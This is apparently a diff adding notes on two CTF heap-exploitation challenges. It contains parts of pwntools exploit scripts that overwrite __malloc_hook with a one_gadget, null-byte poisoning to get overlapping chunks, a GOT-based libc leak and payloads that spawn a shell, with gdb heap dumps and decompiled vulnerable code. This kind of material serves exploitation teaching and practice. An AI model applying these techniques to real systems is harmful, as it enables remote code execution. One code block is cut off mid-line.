+write_chunk(chunk_c, p64(malloc_hook-0x23))
+
+alloc(size)             
+alloc(size)
+
+# with the following call to alloc()
+# we are going to allocate a new chunk into a fast bin
+# the fast bin address will be taken from the fast bin
+# double linked list which we corrupted to point to an
+# arbitrary address instead of the one of a valid chunk
+# this means that we will allocate and make writable any
+# part of the memory pointed by the address we wrote before
+target = alloc(size)
+
+# we will do what we just described to write the address of
+# a batch of instructions that will spawn a shell in place of
+# the hook of the malloc function
+write_chunk(target, b'A'*(35-16) + p64(one_gadget))
+
+# we will call the malloc function, since now it's hook
+# points to the magic gadget, a shell will be spawned instead
+# of calling the malloc
+input('press any key to execute payload...')
+r.recvuntil(b&quot;&gt; &quot;)
+r.sendline(b&quot;1&quot;)
+r.recvuntil(b&quot;Size: &quot;)
+input('press any key...')
+r.sendline(b&quot;%d&quot; % size)
+r.interactive()</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="playground">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#playground">#</doc-anchor-trigger>
+        <span>playground</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="what-does-it-do-1">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#what-does-it-do-1">#</doc-anchor-trigger>
+        <span>What does it do</span>
+    </h3>
+</doc-anchor-target>
+<p>It has only the <code v-pre>main</code> function which encompasses all the functionality. There are some nested loops that executes the following functionalities:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">malloc n, free p, show p [n], write p [n]</code></pre>
+</doc-codeblock></div>
+<p>Basically it can:</p>
+<ul>
+<li>Allocate a chunk of size <code v-pre>n</code> and return its address</li>
+<li>Free a chunk, given its address <code v-pre>p</code></li>
+<li>Show the content of a chunk given <code v-pre>p</code>. By default it shows the first 8 bytes of data, unless a size <code v-pre>n</code> is specified.</li>
+<li>Write some data into a chunk, given <code v-pre>p</code>.</li>
+</ul>
+<p>There are some obvious vulnerabilities: for e.g. the chunk freeing is achieved without checking if the chunk is allocated or not, which could be used as an attack surface to carry a fast bin attack.</p>
+<doc-anchor-target id="libc-version">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#libc-version">#</doc-anchor-trigger>
+        <span><code v-pre>libc</code> version</span>
+    </h3>
+</doc-anchor-target>
+<p>A note about <code v-pre>libc</code> version: the program is using <code v-pre>libc</code> version 2.27 <u>which incorporates a backport of the tcache key</u>.</p>
+<doc-anchor-target id="the-exploit">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#the-exploit">#</doc-anchor-trigger>
+        <span>The exploit</span>
+    </h3>
+</doc-anchor-target>
+<p>Here&#x27;s what we need to do in order to exploit this binary:</p>
+<ol>
+<li>Set to zero <code v-pre>min_heap</code></li>
+<li>Overwrite <code v-pre>max_heap</code> with a high value</li>
+<li>Overwrite <code v-pre>__malloc_hook</code> with the magic gadget.</li>
+</ol>
+<p><strong>Note</strong>: <code v-pre>min_heap</code> and <code v-pre>max_heap</code> are two global variables on which a sort of boundary check is performed before working with the heap.</p>
+<p><strong>Setting <code v-pre>min_heap</code> to zero</strong></p>
+<p>We need to exploit the presence of the key in the tcache, since it allows us to overwrite any DWORD with zeros. Here&#x27;s an example:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ LD_PRELOAD=./libc-2.27.so ./playground
+pid: 10714
+main: 0x5555555551d9
+&gt; malloc 32
+==&gt; 0x555555559280
+&gt; malloc 32
+==&gt; 0x5555555592b0
+&gt; free 0x555555559280
+==&gt; ok
+&gt; free  0x5555555592b0
+==&gt; ok
+&gt; show  0x5555555592b0 2
+0x5555555592b0:   0x555555559280
+0x5555555592b8:   0x555555559010
+&gt; write 0x5555555592b0 8
+==&gt; read
+AAAAAAAAA
+==&gt; done
+&gt; Commands: malloc n, free p, show p [n], write p [n]
+&gt; show 0x5555555592b0 2
+0x5555555592b0: 0x4141414141414141
+0x5555555592b8:   0x555555559010
+&gt; malloc 32
+==&gt; 0x5555555592b0
+&gt; malloc 32
+[1]    10714 segmentation fault (core dumped)  LD_PRELOAD=./libc-2.27.so ./playground</code></pre>
+</doc-codeblock></div>
+<p>We can see that the program segfaulted because it tried to allocate <code v-pre>0x4141414141414141</code>.</p>
+<doc-anchor-target id="note-about-one_gadget">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#note-about-one_gadget">#</doc-anchor-trigger>
+        <span>Note about <code v-pre>one_gadget</code></span>
+    </h3>
+</doc-anchor-target>
+<p>If we use the following flag: <code v-pre>--level 1</code> when running <code v-pre>one_gadget</code> it will find a lot more gadgets.</p>
+<doc-anchor-target id="pkm">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#pkm">#</doc-anchor-trigger>
+        <span>pkm</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">❯ file pkm_nopie
+pkm_nopie: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 4.4.0, BuildID[sha1]=13e816c2d730c2c5220d79c23e1d166432537e9b, with debug_info, not stripped</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="a-recall-on-the-heap">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#a-recall-on-the-heap">#</doc-anchor-trigger>
+        <span>A recall on the heap</span>
+    </h3>
+</doc-anchor-target>
+<p><strong>Allocated chunk</strong></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Size of previous chunk, if unallocated (P clear)  |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Size of chunk, in bytes                     |A|M|P|
+      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             User data starts here...                          .
+            .                                                               .
+            .             (malloc_usable_size() bytes)                      .
+            .                                                               |
+nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             (size of chunk, but used for application data)    |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Size of next chunk, in bytes                |A|0|1|
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre>
+</doc-codeblock></div>
+<p><strong>Free chunk</strong></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Size of previous chunk, if unallocated (P clear)  |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+    `head:' |             Size of chunk, in bytes                     |A|0|P|
+      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Forward pointer to next chunk in list             |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Back pointer to previous chunk in list            |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Unused space (may be 0 bytes long)                .
+            .                                                               .
+            .                                                               |
+nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+    `foot:' |             Size of chunk, in bytes                           |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Size of next chunk, in bytes                |A|0|0|
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre>
+</doc-codeblock></div>
+<p><strong>Note about gdb <code v-pre>ptype</code> command</strong></p>
+<p><code v-pre>ptype</code> is a gdb command that allows to print variables of binaries that include symbols. For example in this binary we have the <code v-pre>pkm</code> variable, which is a struct. Thanks to that command we can print it and implement it in Ghidra for much easier code readability:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">pwndbg&gt; ptype pkm
+type = struct pkm {
+    uint64_t atk;
+    uint64_t def;
+    uint64_t hp;
+    uint64_t max_hp;
+    uint8_t status;
+    char *name;
+    uint64_t IVs[5];
+    move moves[10];
+}
+pwndbg&gt; ptype move
+type = struct move {
+    char *name;
+    void (*fun)(struct pkm *, struct pkm *);
+}</code></pre>
+</doc-codeblock></div>
+<p>More on that:</p>
+<blockquote>
+<p><code v-pre>ptype</code> <code v-pre>typename</code>
+Print a description of data type typename. typename may be the name of a type, or for C code it may have the form <code v-pre>class class-name', </code>struct struct-tag&#x27;, <code v-pre>union union-tag' or </code>enum enum-tag&#x27;.</p>
+</blockquote>
+<p><strong>Some informations about the heap management</strong></p>
+<p>If we try to allocate a new pokemon, and to rename it, we get the following heap configuration:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x101
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405100
+Size: 0x21
+
+Top chunk | PREV_INUSE
+Addr: 0x405120
+Size: 0x20ee1</code></pre>
+</doc-codeblock></div>
+<p>As we can see the chunk <code v-pre>0x101</code> bytes big is the chunk containing the pokemon, since it is allocated with a <code v-pre>malloc(0xf8)</code>. The <code v-pre>0x21</code> chunk instead is the chunk allocated to read from stdin the pokemon name, since the <code v-pre>get_string</code> function allocates a chunk of arbitrary size, and I passed to it <code v-pre>len('pikachu')</code>. Content of pokemon in the heap:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">x/12gx  0x405000
+0x405000:       0x0000000000000000      0x0000000000000101
+0x405010:       0x0000000000000028      0x000000000000000a
+0x405020:       0x0000000000000064      0x0000000000000064
+0x405030:       0x0000000000000000      0x0000000000405110</code></pre>
+</doc-codeblock></div>
+<p>Note that the chunk, as said before, is 257 bytes long, which is 32 WORDS. From <code v-pre>0x405100</code> and on we have another chunk, which in this case is the one containing the string which represents the pokemon name, and then we have the top chunk.</p>
+<p>As for the content itself, we&#x27;ve got the statistics, which is decimal values look like this:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none"> *Name: pikachu
+ *ATK:  40
+ *DEF:  10
+ *HP:   100/100
+ *Moves:</code></pre>
+</doc-codeblock></div>
+<p>And then there&#x27;s the pointer to the pokemon name, which is <code v-pre>0x405110</code>. As for the second chunk we&#x27;ve got:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">0x405100:       0x0000000000000000      0x0000000000000021
+0x405110:       0x00756863616b6970      0x0000000000000000</code></pre>
+</doc-codeblock></div>
+<p>Which makes sense, since its <code v-pre>0x21</code> bytes long, which is 4 WORDS long.</p>
+<doc-anchor-target id="exploit-idea">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#exploit-idea">#</doc-anchor-trigger>
+        <span>Exploit idea</span>
+    </h3>
+</doc-anchor-target>
+<p>We need to put in place a null byte poisoning exploit, which can be achieved trough the function used to assign names to pokemons:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">char * get_string(void) {
+  long in_FS_OFFSET;
+  uint size;
+  uint i;
+  char *chunk;
+  long canary;
+
+  canary = *(long *)(in_FS_OFFSET + 0x28);
+  size = 0;
+  while (size == 0) {
+    printf(&quot;[.] insert length: &quot;);
+    __isoc99_scanf(&amp;format_str,&amp;size);
+  }
+  chunk = (char *)malloc((ulong)size);
+  i = 0;
+  while ((i &lt; size &amp;&amp; (read(0,chunk + i,1), chunk[i] != '\n'))) {
+    i = i + 1;
+  }
+                    /* here's your null byte */
+  chunk[i] = '\0';
+  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
+    return chunk;
+  }
+  __stack_chk_fail();
+}</code></pre>
+</doc-codeblock></div>
+<p>To bypass the null byte overflow mitigation we need to exploit the <code v-pre>rename_pokemon</code> function, and fill a buffer which should contain a pokemon name with fake previous sizes. This is the function that calls <code v-pre>get_string</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">void rename_pkm(void) {
+  pkm *ppVar1;
+  byte pkm;
+  undefined8 uVar2;
+
+  puts(&quot;[*] Rename PKM!&quot;);
+  pkm = get_pkm();
+  if ((*(long *)((long)&amp;(&amp;pkms)[(int)(uint)pkm]-&gt;name + 7) != 0) &amp;&amp;
+     (*(undefined **)((long)&amp;(&amp;pkms)[(int)(uint)pkm]-&gt;name + 7) != UNKNOWN)) {
+    free(*(void **)((long)&amp;(&amp;pkms)[(int)(uint)pkm]-&gt;name + 7));
+  }
+  ppVar1 = (&amp;pkms)[(int)(uint)pkm];
+  uVar2 = get_string();
+  *(undefined8 *)((long)&amp;ppVar1-&gt;name + 7) = uVar2;
+  return;
+}</code></pre>
+</doc-codeblock></div>
+<p>Where <code v-pre>UNKNOWN</code> is a global variable containing an address to the &#x27;PKM&#x27; hardcoded string. <del>This means that we can avoid to free a chunk if we previously wrote that in it.</del></p>
+<doc-anchor-target id="how-to-perform-the-null-byte-poisoning">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#how-to-perform-the-null-byte-poisoning">#</doc-anchor-trigger>
+        <span>How to perform the <code v-pre>null byte</code> poisoning</span>
+    </h3>
+</doc-anchor-target>
+<p>If we create two pokemon and allocate two chunks of <code v-pre>0x200</code>, that&#x27;s the situation on the heap:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x101
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405100
+Size: 0x101
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405200
+Size: 0x211
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405410
+Size: 0x211
+
+Top chunk | PREV_INUSE
+Addr: 0x405620
+Size: 0x209e1</code></pre>
+</doc-codeblock></div>
+<p>Let&#x27;s call those chunk as follows:</p>
+<ol>
+<li><strong>Chunk 1</strong>: first chunk in the heap, it&#x27;s pokemon 1</li>
+<li><strong>Chunk 2</strong>: second chunk, it&#x27;s pokemon 2</li>
+<li><strong>Chunk 3</strong>: third chunk, it corresponds to pokemon 1 name</li>
+<li><strong>Chunk 4</strong>: third chunk, it corresponds to pokemon 2 name</li>
+</ol>
+<p>Let&#x27;s remember that the vulnerable function is the one that allocates the chunks of arbitrary length, which is the one we used to allocate the two <code v-pre>0x200</code> chunks. here&#x27;s their content:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">pwndbg&gt; x/68gx 0x405200
+0x405200:       0x0000000000000000      0x0000000000000211
+0x405210:       0x4141414141414141      0x4141414141414141
+0x405220:       0x4141414141414141      0x4141414141414141
+0x405230:       0x4141414141414141      0x4141414141414141
+0x405240:       0x4141414141414141      0x4141414141414141
+0x405250:       0x4141414141414141      0x4141414141414141
+0x405260:       0x4141414141414141      0x4141414141414141
+0x405270:       0x4141414141414141      0x4141414141414141
+0x405280:       0x4141414141414141      0x4141414141414141
+0x405290:       0x4141414141414141      0x4141414141414141
+0x4052a0:       0x4141414141414141      0x4141414141414141
+0x4052b0:       0x4141414141414141      0x4141414141414141
+0x4052c0:       0x4141414141414141      0x4141414141414141
+0x4052d0:       0x4141414141414141      0x4141414141414141
+0x4052e0:       0x4141414141414141      0x4141414141414141
+0x4052f0:       0x4141414141414141      0x4141414141414141
+0x405300:       0x4141414141414141      0x4141414141414141
+0x405310:       0x4141414141414141      0x4141414141414141
+0x405320:       0x4141414141414141      0x4141414141414141
+0x405330:       0x4141414141414141      0x4141414141414141
+0x405340:       0x4141414141414141      0x4141414141414141
+0x405350:       0x4141414141414141      0x4141414141414141
+0x405360:       0x4141414141414141      0x4141414141414141
+0x405370:       0x4141414141414141      0x4141414141414141
+0x405380:       0x4141414141414141      0x4141414141414141
+0x405390:       0x4141414141414141      0x4141414141414141
+0x4053a0:       0x4141414141414141      0x4141414141414141
+0x4053b0:       0x4141414141414141      0x4141414141414141
+0x4053c0:       0x4141414141414141      0x4141414141414141
+0x4053d0:       0x4141414141414141      0x4141414141414141
+0x4053e0:       0x4141414141414141      0x4141414141414141
+0x4053f0:       0x4141414141414141      0x4141414141414141
+0x405400:       0x4141414141414141      0x4141414141414141
+0x405410:       0x0000000000000000      0x0000000000000211</code></pre>
+</doc-codeblock></div>
+<p>In the last row we have the header of the following chunk. As for the chunk at <code v-pre>0x405200</code>, we have the usual structure:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Size of previous chunk, if unallocated (P clear)  |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Size of chunk, in bytes                     |A|M|P|
+      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             User data starts here...                          .
+            .                                                               .
+            .             (malloc_usable_size() bytes)                      .
+            .                                                               |
+nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             (size of chunk, but used for application data)    |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Size of next chunk, in bytes                |A|0|1|
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre>
+</doc-codeblock></div>
+<p>Now, if we delete the first pokemon (chunk 1), we free both chunk 1 and chunk 3, since the binary will delete both the chunk containing the pokemon itself, and the chunk containing its name. We end up in this situation:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">pwndbg&gt; heap
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x405000
+Size: 0x101
+fd: 0x405200
+bk: 0x7ffff7dcdc80
+
+Allocated chunk
+Addr: 0x405100
+Size: 0x100
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x405200
+Size: 0x211
+fd: 0x7ffff7dcdc80
+bk: 0x405000
+
+Allocated chunk
+Addr: 0x405410
+Size: 0x210
+
+Top chunk | PREV_INUSE
+Addr: 0x405620
+Size: 0x209e1</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">pwndbg&gt; x/68gx 0x405200
+0x405200:       0x0000000000000000      0x0000000000000211
+0x405210:       0x00007ffff7dcdc80      0x0000000000405000
+0x405220:       0x4141414141414141      0x4141414141414141
+0x405230:       0x4141414141414141      0x4141414141414141
+0x405240:       0x4141414141414141      0x4141414141414141
+0x405250:       0x4141414141414141      0x4141414141414141
+0x405260:       0x4141414141414141      0x4141414141414141
+0x405270:       0x4141414141414141      0x4141414141414141
+0x405280:       0x4141414141414141      0x4141414141414141
+0x405290:       0x4141414141414141      0x4141414141414141
+0x4052a0:       0x4141414141414141      0x4141414141414141
+0x4052b0:       0x4141414141414141      0x4141414141414141
+0x4052c0:       0x4141414141414141      0x4141414141414141
+0x4052d0:       0x4141414141414141      0x4141414141414141
+0x4052e0:       0x4141414141414141      0x4141414141414141
+0x4052f0:       0x4141414141414141      0x4141414141414141
+0x405300:       0x4141414141414141      0x4141414141414141
+0x405310:       0x4141414141414141      0x4141414141414141
+0x405320:       0x4141414141414141      0x4141414141414141
+0x405330:       0x4141414141414141      0x4141414141414141
+0x405340:       0x4141414141414141      0x4141414141414141
+0x405350:       0x4141414141414141      0x4141414141414141
+0x405360:       0x4141414141414141      0x4141414141414141
+0x405370:       0x4141414141414141      0x4141414141414141
+0x405380:       0x4141414141414141      0x4141414141414141
+0x405390:       0x4141414141414141      0x4141414141414141
+0x4053a0:       0x4141414141414141      0x4141414141414141
+0x4053b0:       0x4141414141414141      0x4141414141414141
+0x4053c0:       0x4141414141414141      0x4141414141414141
+0x4053d0:       0x4141414141414141      0x4141414141414141
+0x4053e0:       0x4141414141414141      0x4141414141414141
+0x4053f0:       0x4141414141414141      0x4141414141414141
+0x405400:       0x4141414141414141      0x4141414141414141
+0x405410:       0x0000000000000210      0x0000000000000210</code></pre>
+</doc-codeblock></div>
+<p><strong>That&#x27;s needed to trigger the null byte</strong>: in fact if we allocate again pokemon 1 and its name, we should get two identical sized chunks in the same spots as before, but the allocation of the chunk representing the pokemon name (chunk 3) would result in a null byte overflow into the name of pokemon 2 (chunk 4), which is immediatly after.</p>
+<doc-anchor-target id="after-executing-the-poisoning">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#after-executing-the-poisoning">#</doc-anchor-trigger>
+        <span>After executing the poisoning</span>
+    </h4>
+</doc-anchor-target>
+<p>This is the script <code v-pre>stdout</code> that led to the heap setup below:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">creating a pokemon... done! id 0
+creating a pokemon... done! id 1
+creating a pokemon... done! id 2
+creating a pokemon... done! id 3
+renaming pkm (id: 2)
+renaming pkm (id: 3)
+creating a pokemon... done! id 4
+renaming pkm (id: 3)
+[1] initial setup done. Press any key to continue...
+killing pkm (id: 3) :(
+creating a pokemon... done! id 3
+[2] freed B. Press any key to continue...
+renaming pkm (id: 2)
+[3] did null byte, now B length should be one byte smaller. Press any key to continue...
+renaming pkm (id: 1)
+creating a pokemon... done! id 5
+[4] allocated B1 and B2. Press any key to continue...
+killing pkm (id: 1) :(
+creating a pokemon... done! id 1
+[5] freed B1. Press any key to continue...
+killing pkm (id: 4) :(
+[6] freed C. Press any key to continue...
+renaming pkm (id: 0)
+[7] Allocated overlapping chunk. Press any key to continue...</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-nasm"><code v-pre class="language-nasm">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x101
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405100
+Size: 0x101
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405200
+Size: 0x101
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405300
+Size: 0x101
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405400
+Size: 0x211
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405610
+Size: 0x411
+
+Top chunk | PREV_INUSE
+Addr: 0x405a20
+Size: 0x205e1</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-nasm"><code v-pre class="language-nasm">0x405610:       0x4141414141414141      0x0000000000000411
+0x405620:       0x00007fff004d4b50      0x00007ffff7dcdd10
+0x405630:       0x0000000000000208      0x0000000000000208
+0x405640:       0x0000000000000208      0x0000000000000208
+0x405650:       0x0000000000000208      0x0000000000000208
+0x405660:       0x0000000000000208      0x0000000000000208
+0x405670:       0x0000000000000208      0x0000000000000208
+0x405680:       0x0000000000000208      0x0000000000000208
+0x405690:       0x0000000000000208      0x0000000000000208
+0x4056a0:       0x0000000000000208      0x0000000000000208
+0x4056b0:       0x00000000000000a0      0x0000000000000100
+0x4056c0:       0x0000000000000028      0x000000000000000a
+0x4056d0:       0x0000000000000064      0x0000000000000064
+0x4056e0:       0x0000000000000208      0x0000000000402036
+0x4056f0:       0x0000000000000005      0x0000000000000208
+0x405700:       0x0000000000000208      0x0000000000000208
+0x405710:       0x0000000000000208      0x0000000000000000
+0x405720:       0x0000000000000000      0x0000000000000000
+0x405730:       0x0000000000000000      0x0000000000000000
+0x405740:       0x0000000000000000      0x0000000000000000
+0x405750:       0x0000000000000000      0x0000000000000000
+0x405760:       0x0000000000000000      0x0000000000000000
+0x405770:       0x0000000000000000      0x0000000000000000
+0x405780:       0x0000000000000000      0x0000000000000000
+0x405790:       0x0000000000000000      0x0000000000000000
+0x4057a0:       0x0000000000000000      0x0000000000000000
+0x4057b0:       0x0000000000000000      0x0000000000000061
+0x4057c0:       0x00007ffff7dcdcd0      0x00007ffff7dcdcd0
+0x4057d0:       0x0000000000000208      0x0000000000000208
+0x4057e0:       0x0000000000000208      0x0000000000000208
+0x4057f0:       0x0000000000000208      0x0000000000000208
+0x405800:       0x0000000000000208      0x0000000000000208
+0x405810:       0x0000000000000060      0x0000000000000208
+0x405820:       0x0000000000000210      0x0000000000000100
+0x405830:       0x0000000000000028      0x000000000000000a
+0x405840:       0x0000000000000064      0x0000000000000064
+0x405850:       0x0000000000000000      0x0000000000402036
+0x405860:       0x0000000000000004      0x0000000000000000
+0x405870:       0x0000000000000000      0x0000000000000000
+0x405880:       0x0000000000000000      0x0000000000000000
+0x405890:       0x0000000000000000      0x0000000000000000
+0x4058a0:       0x0000000000000000      0x0000000000000000
+0x4058b0:       0x0000000000000000      0x0000000000000000
+0x4058c0:       0x0000000000000000      0x0000000000000000
+0x4058d0:       0x0000000000000000      0x0000000000000000
+0x4058e0:       0x0000000000000000      0x0000000000000000
+0x4058f0:       0x0000000000000000      0x0000000000000000
+0x405900:       0x0000000000000000      0x0000000000000000
+0x405910:       0x0000000000000000      0x0000000000000000
+0x405920:       0x0000000000000000      0x00000000000206e1</code></pre>
+</doc-codeblock></div>
+<p>As you can see from <code v-pre>0x4056b0</code>, if we do the <code v-pre>heap</code> command in gdb, it does not report the overlapped chunk which we get printed when we manually print heap addresses. Looks like we managed to correctly overflow and allocate two overlapping chunks. Now we can exploit that to carry the attack.</p>
+<doc-anchor-target id="and-now">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#and-now">#</doc-anchor-trigger>
+        <span>And now?</span>
+    </h3>
+</doc-anchor-target>
+<p>Basically up to now we just did things to trick malloc into giving us two chunks allocated and overlapping. Now we can actuate the exploit, which consists in replacing the function pointer of some move of a pokemon (chunk B2) with our exploit to get rce. We can do that by writing a target address in the overlapped chunk resulting from the null byte overflow. The binary helps us because each pkm struct has an array of function pointer which gets called by a function of the binary. So, to recap:</p>
+<ol>
+<li>We perform the null byte exploit;</li>
+<li>We use the overlapping chunk to write an address of interest in the moves array of the overlapped pokemon;</li>
+<li>We call the function which executes the code at the given address to gain RCE.</li>
+</ol>
+<p>We could write a <code v-pre>one_gadget</code> address, or somethigs else. In my case <code v-pre>one_gadget</code> was not working, so I wrote
+the following into the overlapped pokemon:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">p = {
+    'binsh' : b'/bin/sh\0',
+    'stats' : p64(1000)*4,
+    'name' : p64(0),
+    'IVs' : p64(0)*5,
+    'moves' : (p64(0) + p64(target))*10
+}</code></pre>
+</doc-codeblock></div>
+<p>With <code v-pre>binsh</code> written in the chunk header, since by checking with gdb I saw that the argument passed to the address called during the <code v-pre>fight_pkm</code> was in the beginning of its chunk. Problem is, first of all we need to leak an address belonging to <code v-pre>libc</code>... This can be done via some symbols already resolved and present in the <code v-pre>GOT</code>, since the binary is not <code v-pre>PIE</code>. If we exploit the overlapping chunks to put an adress of the <code v-pre>GOT</code> into one of the overlapped pokemon chunk, and in particular into the name field of the pkm struct, we can print a <code v-pre>libc</code> runtime address. Code for this:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">p = {
+    'pkm' : b'PKM\0',
+    'padding' : b'A'*196,
+    'gotaddr' : p64(0x404018)   # nopie binary, we can hardcode addresses
+}
+rename_handler(r, pkFIN, len(formatter(p)), formatter(p))
+leak = info_handler(r, pkB2)
+libcleak = hex(unpack(leak[0], 'all', endian='little', sign=False))
+print(colors['red'] + 'libc leak: {}'.format(hex(int(libcleak, 16))))
+printer(colors['cyan'] + </code></pre>
+</doc-codeblock></div>
+<p>So we have a two stage exploit:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">   1. First we leak `libc`
+   2. Then we use the payload to spawn a shell</code></pre>
+</doc-codeblock></div>
+<p>Script&#x27;s <code v-pre>stdout</code> of the exploit in action:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">renaming pkm (id: 0)
+getting info about pkm (id: 5)
+libc leak: 0x7ffff7a7f6c0
+[8] Wrote address of GOT in some chunk to leak libc. Press any key to continue...
+system address: 0x7ffff7a395f0
+[9] Press any key to write target in memory...
+renaming pkm (id: 0)
+[10] Press any key to call target...
+pkm 5 is fighting pkm 1 with 9
+[*] Switching to interactive mode
